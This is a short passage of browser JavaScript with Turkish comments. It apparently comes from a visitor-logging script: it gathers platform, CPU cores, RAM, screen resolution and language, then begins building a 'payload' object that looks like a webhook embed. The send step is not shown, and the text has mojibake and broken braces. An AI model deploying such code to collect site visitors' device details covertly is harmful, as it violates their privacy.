            } catch(e) {}

            // 4. DONANIM VE EKRAN (OS, RAM, CPU)

                data.sys = `ğŸ’» **OS:** ${navigator.platform}\nğŸ§  **CPU:** ${navigator.hardwareConcurrency} Ã‡ekirdek\nğŸ’¾ **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\nğŸ“ **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)\nğŸŒ **Dil:** ${navigator.language}`;
            } catch(e) {}

            const payload = {

                    color: 15158332,
